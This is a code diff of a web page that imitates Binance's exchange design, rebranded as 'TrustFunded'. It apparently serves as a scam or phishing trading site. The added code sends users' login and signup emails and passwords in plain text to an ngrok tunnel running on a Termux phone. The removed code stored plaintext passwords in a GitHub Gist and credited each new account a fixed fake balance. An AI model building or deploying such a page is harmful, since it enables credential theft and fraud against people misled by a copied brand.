@@ -9,10 +9,7 @@
     <script src="https://unpkg.com/lucide@latest"></script>
     <!-- Font Awesome for login icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <!-- Config file injected by GitHub Actions -->
-    <script src="config.js"></script>
     <style>
-        /* ========= ORIGINAL LOADER STYLES (PRESERVED) ========= */
         :root {
             --binance-yellow: #FCD535;
             --bg-dark: #0B0E11;
@@ -28,7 +25,6 @@
             overflow: hidden; 
         }
 
-        /* Full-screen Loader Container */
         #loader-wrapper {
             position: fixed;
             top: 0;
@@ -201,6 +197,7 @@
             stroke-dasharray: 300; 
             stroke-dashoffset: 300; 
             animation: draw 2.5s forwards cubic-bezier(0.4, 0, 0.2, 1); 
+            filter: drop-shadow(0 0 3px rgba(14, 203, 129, 0.4));
         }
         @keyframes draw { to { stroke-dashoffset: 0; } }
         
@@ -259,6 +256,22 @@
             opacity: 0.6;
             cursor: not-allowed;
         }
+        
+        .server-status {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 10px;
+            background: rgba(0,0,0,0.5);
+            padding: 4px 8px;
+            border-radius: 10px;
+            color: #ff6b6b;
+            z-index: 9999;
+        }
+        
+        .server-status.connected {
+            color: #0ecb81;
+        }
     </style>
 </head>
 <body>
@@ -290,7 +303,7 @@
                     <path d="M24 19.2L33.6 28.8L24 38.4L14.4 28.8L24 19.2Z" fill="#FCD535"/>
                     <path d="M14.4 9.6L24 19.2L14.4 28.8L4.8 19.2L14.4 9.6Z" fill="#FCD535"/>
                 </svg>
-                <h1 id="page-title" class="text-2xl font-bold text-white">Welcome to Binance</h1>
+                <h1 id="page-title" class="text-2xl font-bold text-white">Welcome to TrustFunded</h1>
                 <p class="text-gray-400 text-sm mt-1">Access your trading dashboard</p>
             </div>
 
@@ -302,6 +315,7 @@
                         <input type="text" id="login-email" placeholder="Email or phone number" class="bg-transparent w-full outline-none text-sm text-white">
                     </div>
                 </div>
+
                 <div class="mb-4">
                     <label class="block text-sm text-gray-400 mb-2">Password</label>
                     <div class="input-bg rounded-xl p-3 flex items-center justify-between">
@@ -312,10 +326,12 @@
                         <i class="fa-regular fa-eye text-gray-500 cursor-pointer" onclick="togglePassword('login-password', this)"></i>
                     </div>
                 </div>
+
                 <div class="flex items-start mb-6">
                     <input type="checkbox" id="login-agree" class="mt-1 mr-2 accent-yellow-400">
-                    <span class="text-xs text-gray-400">I agree to Binance's <a href="#" class="text-yellow-400">Terms of Service</a> and <a href="#" class="text-yellow-400">Privacy Notice</a>.</span>
+                    <span class="text-xs text-gray-400">I agree to TrustFunded's <a href="#" class="text-yellow-400">Terms of Service</a> and <a href="#" class="text-yellow-400">Privacy Notice</a>.</span>
                 </div>
+
                 <button onclick="handleLogin()" id="login-btn" class="binance-yellow-btn w-full py-3 rounded-xl font-bold mb-4 transition">Continue to Dashboard</button>
                 <div class="text-center text-gray-500 text-sm mb-4">or</div>
                 <button onclick="toggleForms()" class="w-full border border-gray-600 py-3 rounded-xl font-bold hover:bg-gray-800 transition text-white">Create New Account</button>
@@ -329,6 +345,7 @@
                         <input type="email" id="signup-email" placeholder="Email address" class="bg-transparent w-full outline-none text-sm text-white">
                     </div>
                 </div>
+
                 <div class="mb-4">
                     <label class="block text-sm text-gray-400 mb-2">Password</label>
                     <div class="input-bg rounded-xl p-3 flex items-center justify-between">
@@ -339,6 +356,7 @@
                         <i class="fa-regular fa-eye text-gray-500 cursor-pointer" onclick="togglePassword('signup-password', this)"></i>
                     </div>
                 </div>
+
                 <div class="mb-4">
                     <label class="block text-sm text-gray-400 mb-2">Referral ID (optional)</label>
                     <div class="input-bg rounded-xl p-3">
@@ -346,10 +364,12 @@
                         <input type="text" id="signup-referral" placeholder="Referral ID" class="bg-transparent w-full outline-none text-sm text-gray-400">
                     </div>
                 </div>
+
                 <div class="flex items-start mb-6">
                     <input type="checkbox" id="signup-agree" class="mt-1 mr-2 accent-yellow-400">
-                    <span class="text-xs text-gray-400">By creating an account, I agree to Binance's <a href="#" class="text-yellow-400">Terms of Service</a> and <a href="#" class="text-yellow-400">Privacy Notice</a>.</span>
+                    <span class="text-xs text-gray-400">By creating an account, I agree to TrustFunded's <a href="#" class="text-yellow-400">Terms of Service</a> and <a href="#" class="text-yellow-400">Privacy Notice</a>.</span>
                 </div>
+
                 <button onclick="handleSignup()" id="signup-btn" class="binance-yellow-btn w-full py-3 rounded-xl font-bold mb-4 transition">Create Account</button>
                 <p class="text-center text-sm text-gray-400">
                     Already have an account? <a href="javascript:void(0)" onclick="toggleForms()" class="text-yellow-400 hover:underline">Log in</a>
@@ -508,19 +528,33 @@
     </div>
 
     <div id="toast-message" class="toast-message"></div>
+    <div id="server-status" class="server-status">🔌 Connecting...</div>
 
     <script>
         lucide.createIcons();
         
-        // ========= GITHUB GIST CONFIGURATION =========
-        const GIST_ID = "cf61e203b0f3ac1a58b7e49d86c6c24d";
-        const GIST_API_URL = `https://api.github.com/gists/${GIST_ID}`;
-        const GITHUB_TOKEN = window.GITHUB_TOKEN || "";
+        // ========= TERMUX API CONFIGURATION =========
+        // Your ngrok URL from Termux
+        const API_URL = "https://zincic-heimish-margert.ngrok-free.dev";
         
-        // NO LOCALSTORAGE FALLBACK - Must have token to work
-        if (!GITHUB_TOKEN) {
-            showToast("⚠️ Configuration error: Missing GitHub token. Please contact support.", false);
-            console.error("No GitHub token available. Cannot save user data.");
+        // Check server connection on load
+        async function checkServerConnection() {
+            const statusDiv = document.getElementById('server-status');
+            try {
+                const response = await fetch(`${API_URL}/users`, {
+                    method: 'GET',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                if (response.ok) {
+                    statusDiv.textContent = '✅ Server Connected';
+                    statusDiv.classList.add('connected');
+                } else {
+                    statusDiv.textContent = '⚠️ Server Error';
+                }
+            } catch (error) {
+                statusDiv.textContent = '❌ Server Offline - Check Termux';
+                console.error('Server connection failed:', error);
+            }
         }
         
         function showToast(msg, isSuccess = true) {
@@ -540,108 +574,6 @@
             } else {
                 button.disabled = false;
                 button.innerHTML = originalText;
-            }
-        }
-        
-        async function getUsersFromGist() {
-            if (!GITHUB_TOKEN) {
-                throw new Error("GitHub token not configured");
-            }
-            
-            try {
-                const response = await fetch(GIST_API_URL, {
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Accept': 'application/vnd.github.v3+json'
-                    }
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-                
-                const gist = await response.json();
-                const content = gist.files['users.json']?.content || '{"users": []}';
-                return JSON.parse(content);
-            } catch (error) {
-                console.error('Error reading gist:', error);
-                throw error;
-            }
-        }
-        
-        async function saveUsersToGist(usersData) {
-            if (!GITHUB_TOKEN) {
-                throw new Error("GitHub token not configured");
-            }
-            
-            try {
-                const content = JSON.stringify(usersData, null, 2);
-                const response = await fetch(GIST_API_URL, {
-                    method: 'PATCH',
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Accept': 'application/vnd.github.v3+json',
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        files: {
-                            'users.json': {
-                                content: content
-                            }
-                        }
-                    })
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-                
-                return true;
-            } catch (error) {
-                console.error('Error saving to gist:', error);
-                throw error;
-            }
-        }
-        
-        async function handleLogin() {
-            const email = document.getElementById('login-email').value.trim();
-            const password = document.getElementById('login-password').value;
-            const agree = document.getElementById('login-agree').checked;
-            const loginBtn = document.getElementById('login-btn');
-            
-            if (!email || !password) {
-                showToast('Please enter email and password', false);
-                return;
-            }
-            if (!agree) {
-                showToast('Please agree to the Terms of Service', false);
-                return;
-            }
-            
-            setButtonLoading(loginBtn, true, 'Continue to Dashboard');
-            
-            try {
-                const data = await getUsersFromGist();
-                const user = data.users.find(u => u.email === email && u.password === password);
-                
-                if (user) {
-                    localStorage.setItem('currentUser', JSON.stringify(user));
-                    showToast('Login successful! Welcome to TrustFunded', true);
-                    setTimeout(() => {
-                        document.getElementById('login-overlay').classList.remove('active');
-                        document.body.classList.add('show-dashboard');
-                        document.body.style.overflow = 'auto';
-                        document.documentElement.style.overflow = 'auto';
-                        lucide.createIcons();
-                    }, 500);
-                } else {
-                    showToast('Invalid email or password', false);
-                }
-            } catch (error) {
-                console.error('Login error:', error);
-                showToast('Login failed: ' + error.message, false);
-            } finally {
-                setButtonLoading(loginBtn, false, 'Continue to Dashboard');
             }
         }
         
@@ -668,40 +600,79 @@
             setButtonLoading(signupBtn, true, 'Create Account');
             
             try {
-                const data = await getUsersFromGist();
+                const response = await fetch(`${API_URL}/signup`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password, referral })
+                });
                 
-                if (data.users.find(u => u.email === email)) {
-                    showToast('Email already registered. Please login.', false);
-                    setButtonLoading(signupBtn, false, 'Create Account');
-                    return;
+                const result = await response.json();
+                
+                if (result.success) {
+                    localStorage.setItem('currentUser', JSON.stringify(result.user));
+                    showToast('Account created successfully! Welcome to TrustFunded', true);
+                    setTimeout(() => {
+                        document.getElementById('login-overlay').classList.remove('active');
+                        document.body.classList.add('show-dashboard');
+                        document.body.style.overflow = 'auto';
+                        document.documentElement.style.overflow = 'auto';
+                        lucide.createIcons();
+                    }, 500);
+                } else {
+                    showToast(result.error || 'Signup failed', false);
                 }
-                
-                const newUser = {
-                    email: email,
-                    password: password,
-                    referral: referral,
-                    createdAt: new Date().toISOString(),
-                    balance: 12450.80
-                };
-                
-                data.users.push(newUser);
-                await saveUsersToGist(data);
-                
-                localStorage.setItem('currentUser', JSON.stringify(newUser));
-                showToast('Account created successfully! Welcome to TrustFunded', true);
-                setTimeout(() => {
-                    document.getElementById('login-overlay').classList.remove('active');
-                    document.body.classList.add('show-dashboard');
-                    document.body.style.overflow = 'auto';
-                    document.documentElement.style.overflow = 'auto';
-                    lucide.createIcons();
-                }, 500);
-                
             } catch (error) {
                 console.error('Signup error:', error);
-                showToast('Signup failed: ' + error.message, false);
+                showToast('Cannot connect to server. Make sure Termux is running with ngrok.', false);
             } finally {
                 setButtonLoading(signupBtn, false, 'Create Account');
+            }
+        }
+        
+        async function handleLogin() {
+            const email = document.getElementById('login-email').value.trim();
+            const password = document.getElementById('login-password').value;
+            const agree = document.getElementById('login-agree').checked;
+            const loginBtn = document.getElementById('login-btn');
+            
+            if (!email || !password) {
+                showToast('Please enter email and password', false);
+                return;
+            }
+            if (!agree) {
+                showToast('Please agree to the Terms of Service', false);
+                return;
+            }
+            
+            setButtonLoading(loginBtn, true, 'Continue to Dashboard');
+            
+            try {
+                const response = await fetch(`${API_URL}/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    localStorage.setItem('currentUser', JSON.stringify(result.user));
+                    showToast('Login successful! Welcome to TrustFunded', true);
+                    setTimeout(() => {
+                        document.getElementById('login-overlay').classList.remove('active');
+                        document.body.classList.add('show-dashboard');
+                        document.body.style.overflow = 'auto';
+                        document.documentElement.style.overflow = 'auto';
+                        lucide.createIcons();
+                    }, 500);
+                } else {
+                    showToast(result.error || 'Invalid email or password', false);
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+                showToast('Cannot connect to server. Make sure Termux is running with ngrok.', false);
+            } finally {
+                setButtonLoading(loginBtn, false, 'Continue to Dashboard');
             }
         }
         
@@ -709,10 +680,11 @@
             const loginForm = document.getElementById('login-form');
             const signupForm = document.getElementById('signup-form');
             const title = document.getElementById('page-title');
+
             if (loginForm.classList.contains('hidden')) {
                 loginForm.classList.remove('hidden');
                 signupForm.classList.add('hidden');
-                title.innerText = "Welcome to Binance";
+                title.innerText = "Welcome to TrustFunded";
             } else {
                 loginForm.classList.add('hidden');
                 signupForm.classList.remove('hidden');
@@ -734,10 +706,13 @@
         function showView(viewId) {
             document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('[id^="nav-"]').forEach(n => { n.classList.remove('nav-item-active'); n.classList.add('text-gray-500'); });
+            
             document.getElementById('view-' + viewId).classList.add('active');
             document.getElementById('nav-' + viewId).classList.add('nav-item-active');
+            
             const exBtn = document.getElementById('btn-exchange');
             const waBtn = document.getElementById('btn-wallet');
+            
             if(viewId === 'home') {
                 exBtn.className = "px-5 py-2 text-white bg-[#2b3139] rounded-md shadow-md font-bold";
                 waBtn.className = "px-5 py-2 text-gray-400 font-bold";
@@ -746,7 +721,7 @@
                 exBtn.className = "px-5 py-2 text-gray-400 font-bold";
             }
         }
-        
+
         async function updateLiveTicker() {
             try {
                 const res = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbols=["BTCUSDT","BNBUSDT"]');
@@ -755,6 +730,7 @@
                     const idPrefix = coin.symbol === "BTCUSDT" ? 'btc' : 'bnb';
                     const priceEl = document.getElementById(idPrefix + '-price');
                     const changeEl = document.getElementById(idPrefix + '-change');
+                    
                     if(priceEl) priceEl.innerText = parseFloat(coin.lastPrice).toLocaleString(undefined, { minimumFractionDigits: 2 });
                     if(changeEl) {
                         const pct = parseFloat(coin.priceChangePercent).toFixed(2);
@@ -764,7 +740,7 @@
                 });
             } catch (err) { console.error("Update failed", err); }
         }
-        
+
         let isHidden = false;
         function toggleBalance() {
             isHidden = !isHidden;
@@ -772,15 +748,19 @@
             document.getElementById('home-eye-icon').setAttribute('data-lucide', isHidden ? 'eye-off' : 'eye');
             lucide.createIcons();
         }
-        
+
         setInterval(updateLiveTicker, 5000);
         updateLiveTicker();
+        
+        // Check server connection every 10 seconds
+        setInterval(checkServerConnection, 10000);
         
         window.addEventListener('load', () => {
             setTimeout(() => {
                 document.body.classList.add('hide-loader');
                 setTimeout(() => {
                     document.getElementById('login-overlay').classList.add('active');
+                    checkServerConnection();
                 }, 800);
             }, 3200);
         });
